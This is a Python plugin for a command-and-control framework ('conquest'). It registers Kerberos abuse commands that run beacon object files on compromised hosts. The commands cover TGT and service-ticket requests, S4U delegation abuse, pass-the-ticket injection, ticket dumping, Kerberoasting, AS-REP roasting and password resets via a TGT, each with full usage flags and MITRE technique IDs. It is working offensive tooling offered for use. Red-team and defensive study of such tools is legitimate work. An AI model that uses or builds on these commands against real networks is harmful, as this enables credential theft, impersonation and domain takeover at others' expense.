import conquest 
import os.path

def _kerbeus(command):
    def handler(agentId, cmdline, args):
        args = conquest.get_string(args, 0)
        
        bof = conquest.modules_root() + f"/kerbeus/dist/{command}.x64.o"
        params = conquest.bof_pack("z", [
            args    # z: Command arguments
        ])
        
        if os.path.exists(bof):
            conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}")
        else:
            conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
    return handler

cmd_asktgt = (
    conquest.createCommand(
        name="asktgt", description="Retrieve a TGT for a user using username and password/hash.", 
        example="""asktgt /user:<USER> /password:<PASSWORD> [/domain:<DOMAIN>] [/dc:<DC>] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]
asktgt /user:<USER> /aes256:<HASH> [/domain:<DOMAIN>] [/dc:<DC>] [/ptt] [/nopac] [/opsec]
asktgt /user:<USER> /rc4:<HASH> [/domain:<DOMAIN>] [/dc:<DC>] [/ptt] [/nopac]
asktgt /user:<USER> /nopreauth [/domain:<DOMAIN>] [/dc:<DC>] [/ptt]

Required flags:
  /user:<USER>              STRING     Username.

Authentication (one required):
  /password:<PASSWORD>      STRING     Plaintext password.
  /aes256:<HASH>            STRING     AES256 hash.
  /rc4:<HASH>               STRING     RC4/NTLM hash.
  /nopreauth                BOOL       Request without pre-authentication.

Optional flags:
  /domain:<DOMAIN>          STRING     Target domain.
  /dc:<DC>                  STRING     Domain controller to contact.
  /enctype:{rc4|aes256}     STRING     Encryption type.
  /ptt                      BOOL       Inject ticket into current logon session.
  /nopac                    BOOL       Request a ticket without a PAC.
  /opsec                    BOOL       Use OPSEC-safe techniques.""",
        message="Tasked agent to retrieve a TGT.", 
        mitre=["T1558.001"]
    )
    .addArgString("arguments", "TGT request arguments.", False, "", -1)
    .setHandler(_kerbeus("asktgt"))
).registerToGroup("kerberos abuse")

cmd_asktgs = (
    conquest.createCommand(
        name="asktgs", description="Retrieve a service ticket using a TGT.", 
        example="""asktgs /ticket:<BASE64_TGT> /service:<SPN1,SPN2,...> [/domain:<DOMAIN>] [/dc:<DC>] [/tgs:<BASE64>] [/targetdomain:<DOMAIN>] [/targetuser:<USER>] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /service:<SPN>            STRING     Service SPN(s) to request tickets for, comma-separated.

Optional flags:
  /domain:<DOMAIN>          STRING     Domain to request ticket from.
  /dc:<DC>                  STRING     Domain controller to contact.
  /tgs:<BASE64>             STRING     Base64-encoded TGS for S4U2Proxy.
  /targetdomain:<DOMAIN>    STRING     Target domain for cross-domain requests.
  /targetuser:<USER>        STRING     Target user for S4U2Self/S4U2Proxy.
  /enctype:{rc4|aes256}     STRING     Encryption type (default: aes256).
  /ptt                      BOOL       Inject ticket into current logon session.
  /keylist                  BOOL       List encryption keys.
  /u2u                      BOOL       Request a User-to-User ticket (use with /tgs).
  /opsec                    BOOL       Use OPSEC-safe techniques.""",
        message="Tasked agent to retrieve a service ticket.", 
        mitre=["T1558.003"]
    )
    .addArgString("arguments", "TGS request arguments.", False, "", -1)
    .setHandler(_kerbeus("asktgs"))
).registerToGroup("kerberos abuse")

cmd_renew = (
    conquest.createCommand(
        name="renew", description="Renew a TGT.", 
        example="""renew /ticket:<BASE64> [/dc:<DC>] [/ptt]

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.

Optional flags:
  /dc:<DC>                  STRING     Domain controller.
  /ptt                      BOOL       Inject renewed ticket into current logon session.""",
        message="Tasked agent to renew a TGT.", 
        mitre=["T1558.001"]
    )
    .addArgString("arguments", "TGT renewal arguments.", False, "", -1)
    .setHandler(_kerbeus("renew"))
).registerToGroup("kerberos abuse")

cmd_s4u = (
    conquest.createCommand(
        name="s4u", description="Perform S4U constrained delegation abuse.", 
        example="""s4u /ticket:<BASE64> /service:<SPN> {/impersonateuser:<USER> | /tgs:<BASE64>} [/domain:<DOMAIN>] [/dc:<DC>] [/altservice:<SERVICE>] [/ptt] [/nopac] [/opsec] [/self]

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /service:<SPN>            STRING     Target service SPN.

Impersonation (one required):
  /impersonateuser:<USER>   STRING     User to impersonate (S4U2Self).
  /tgs:<BASE64>             STRING     Base64-encoded TGS (S4U2Proxy).

Optional flags:
  /domain:<DOMAIN>          STRING     Domain.
  /dc:<DC>                  STRING     Domain controller.
  /altservice:<SERVICE>     STRING     Alternative service to substitute in the ticket.
  /ptt                      BOOL       Inject ticket into current logon session.
  /nopac                    BOOL       Request ticket without a PAC.
  /opsec                    BOOL       Use OPSEC-safe techniques.
  /self                     BOOL       Perform S4U2Self only.""",
        message="Tasked agent to perform S4U delegation abuse.", 
        mitre=["T1134.005"]
    )
    .addArgString("arguments", "S4U delegation arguments.", False, "", -1)
    .setHandler(_kerbeus("s4u"))
).registerToGroup("kerberos abuse")

cmd_cross_s4u = (
    conquest.createCommand(
        name="cross-s4u", description="Perform S4U constrained delegation abuse across domains.", 
        example="""cross-s4u /ticket:<BASE64> /service:<SPN> /targetdomain:<DOMAIN> /targetdc:<DC> {/impersonateuser:<USER> | /tgs:<BASE64>} [/domain:<DOMAIN>] [/dc:<DC>] [/altservice:<SERVICE>] [/nopac] [/self]

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /service:<SPN>            STRING     Target service SPN.
  /targetdomain:<DOMAIN>    STRING     Target domain.
  /targetdc:<DC>            STRING     Target domain controller.

Impersonation (one required):
  /impersonateuser:<USER>   STRING     User to impersonate (S4U2Self).
  /tgs:<BASE64>             STRING     Base64-encoded TGS (S4U2Proxy).

Optional flags:
  /domain:<DOMAIN>          STRING     Source domain.
  /dc:<DC>                  STRING     Source domain controller.
  /altservice:<SERVICE>     STRING     Alternative service to substitute in the ticket.
  /nopac                    BOOL       Request ticket without a PAC.
  /self                     BOOL       Perform S4U2Self only.""",
        message="Tasked agent to perform cross-domain S4U delegation abuse.", 
        mitre=["T1134.005"]
    )
    .addArgString("arguments", "Cross-domain S4U arguments.", False, "", -1)
    .setHandler(_kerbeus("cross_s4u"))
).registerToGroup("kerberos abuse")

cmd_ptt = (
    conquest.createCommand(
        name="ptt", description="Inject a Kerberos ticket into a logon session via Pass-the-Ticket.", 
        example="""ptt /ticket:<BASE64> [/luid:<LOGONID>]

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded ticket to inject.

Optional flags:
  /luid:<LOGONID>           STRING     Logon session ID to inject into (default: current session).""",
        message="Tasked agent to inject a TGT.", 
        mitre=["T1550.003"]
    )
    .addArgString("arguments", "PTT arguments.", False, "", -1)
    .setHandler(_kerbeus("ptt"))
).registerToGroup("kerberos abuse")

cmd_purge = (
    conquest.createCommand(
        name="purge", description="Purge tickets from a logon session.", 
        example="""purge [/luid:<LOGONID>]

Optional flags:
  /luid:<LOGONID>           STRING     Logon session ID to purge (default: current session).""",
        message="Tasked agent to purge tickets.", 
        mitre=["T1550.003"]
    )
    .addArgString("arguments", "Purge arguments.", False, "", -1)
    .setHandler(_kerbeus("purge"))
).registerToGroup("kerberos abuse")

cmd_describe = (
    conquest.createCommand(
        name="describe", description="Parse and describe a ticket.", 
        example="""describe /ticket:<BASE64>

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded ticket to describe.""",
        message="Tasked agent to describe a ticket.", 
        mitre=["T1558"]
    )
    .addArgString("arguments", "Ticket to describe.", False, "", -1)
    .setHandler(_kerbeus("describe"))
).registerToGroup("kerberos abuse")

cmd_klist = (
    conquest.createCommand(
        name="klist", description="List tickets in the current user's logon session. If the agent runs in an elevated context, this command will display tickets from all logon sessions.", 
        example="""klist [/luid:<LOGINID>] [/user:<USER>] [/service:<SERVICE>] [/client:<CLIENT>]

Optional flags:
  /luid:<LOGINID>           STRING     Filter by logon session ID.
  /user:<USER>              STRING     Filter by username.
  /service:<SERVICE>        STRING     Filter by service.
  /client:<CLIENT>          STRING     Filter by client.""",
        message="Tasked agent to list tickets.", 
        mitre=["T1558"]
    )
    .addArgString("arguments", "List filters.", False, "", -1)
    .setHandler(_kerbeus("klist"))
).registerToGroup("kerberos abuse")

cmd_dump = (
    conquest.createCommand(
        name="dump", description="Extract current TGTs and service tickets for the current user. If the agent runs in an elevated context, all current TGTs and service tickets are extracted.", 
        example="""dump [/luid:<LOGINID>] [/user:<USER>] [/service:<SERVICE>] [/client:<CLIENT>]

Optional flags:
  /luid:<LOGINID>           STRING     Filter by logon session ID.
  /user:<USER>              STRING     Filter by username.
  /service:<SERVICE>        STRING     Filter by service.
  /client:<CLIENT>          STRING     Filter by client.""",
        message="Tasked agent to dump tickets.", 
        mitre=["T1003.006"]
    )
    .addArgString("arguments", "Dump filters.", False, "", -1)
    .setHandler(_kerbeus("dump"))
).registerToGroup("kerberos abuse")

cmd_triage = (
    conquest.createCommand(
        name="triage", description="List current user tickets. If the agent runs in an elevated context, all Kerberos tickets on the system are displayed.", 
        example="""triage [/luid:<LOGINID>] [/user:<USER>] [/service:<SERVICE>] [/client:<CLIENT>]

Optional flags:
  /luid:<LOGINID>           STRING     Filter by logon session ID.
  /user:<USER>              STRING     Filter by username.
  /service:<SERVICE>        STRING     Filter by service.
  /client:<CLIENT>          STRING     Filter by client.""",
        message="Tasked agent to triage tickets.", 
        mitre=["T1558"]
    )
    .addArgString("arguments", "Triage filters.", False, "", -1)
    .setHandler(_kerbeus("triage"))
).registerToGroup("kerberos abuse")

cmd_tgtdeleg = (
    conquest.createCommand(
        name="tgtdeleg", description="Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API.", 
        example="""tgtdeleg [/target:<SPN>]

Optional flags:
  /target:<SPN>             STRING     Target SPN to request delegation for.""",
        message="Tasked agent to retrieve TGT via delegation.", 
        mitre=["T1558.001"]
    )
    .addArgString("arguments", "TGT delegation arguments.", False, "", -1)
    .setHandler(_kerbeus("tgtdeleg"))
).registerToGroup("kerberos abuse")

cmd_kerberoast = (
    conquest.createCommand(
        name="kerberoast", description="Perform Kerberoasting.", 
        example="""kerberoast /spn:<SPN> [/nopreauth:<USER>] [/dc:<DC>] [/domain:<DOMAIN>]
kerberoast /spn:<SPN> /ticket:<BASE64> [/dc:<DC>]

Required flags:
  /spn:<SPN>                STRING     Target service principal name.

Optional flags:
  /nopreauth:<USER>         STRING     User without pre-authentication to perform the roast as.
  /dc:<DC>                  STRING     Domain controller to contact.
  /domain:<DOMAIN>          STRING     Domain.
  /ticket:<BASE64>          STRING     Base64-encoded TGT to use for the request.""",
        message="Tasked agent to perform Kerberoasting.", 
        mitre=["T1558.003"]
    )
    .addArgString("arguments", "Kerberoasting arguments.", False, "", -1)
    .setHandler(_kerbeus("kerberoasting"))
).registerToGroup("kerberos abuse")

cmd_asreproast = (
    conquest.createCommand(
        name="asreproast", description="Perform AS-REP roasting.", 
        example="""asreproast /user:<USER> [/dc:<DC>] [/domain:<DOMAIN>]

Required flags:
  /user:<USER>              STRING     Target username.

Optional flags:
  /dc:<DC>                  STRING     Domain controller to contact.
  /domain:<DOMAIN>          STRING     Domain.""",
        message="Tasked agent to perform AS-REP roasting.", 
        mitre=["T1558.004"]
    )
    .addArgString("arguments", "AS-REP roasting arguments.", False, "", -1)
    .setHandler(_kerbeus("asreproasting"))
).registerToGroup("kerberos abuse")

cmd_hash = (
    conquest.createCommand(
        name="hash", description="Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes.", 
        example="""hash /password:<PASSWORD> [/user:<USER>] [/domain:<DOMAIN>]

Required flags:
  /password:<PASSWORD>      STRING     Password to hash.

Optional flags:
  /user:<USER>              STRING     Username (used as salt for AES hash calculation).
  /domain:<DOMAIN>          STRING     Domain (used as salt for AES hash calculation).""",
        message="Tasked agent to calculate Kerberos hashes.", 
        mitre=["T1078"]
    )
    .addArgString("arguments", "Hash calculation arguments.", False, "", -1)
    .setHandler(_kerbeus("hash"))
).registerToGroup("kerberos abuse")

cmd_changepw = (
    conquest.createCommand(
        name="changepw", description="Reset a user's password from a supplied TGT.", 
        example="""changepw /ticket:<BASE64> /new:<PASSWORD> [/dc:<DC>] [/targetuser:<USER>] [/targetdomain:<DOMAIN>]

Required flags:
  /ticket:<BASE64>          STRING     Base64-encoded TGT.
  /new:<PASSWORD>           STRING     New password to set.

Optional flags:
  /dc:<DC>                  STRING     Domain controller to contact.
  /targetuser:<USER>        STRING     Target user (default: user in the TGT).
  /targetdomain:<DOMAIN>    STRING     Target domain.""",
        message="Tasked agent to change user password using TGT.", 
        mitre=["T1098"]
    )
    .addArgString("arguments", "Password change arguments.", False, "", -1)
    .setHandler(_kerbeus("changepw"))
).registerToGroup("kerberos abuse")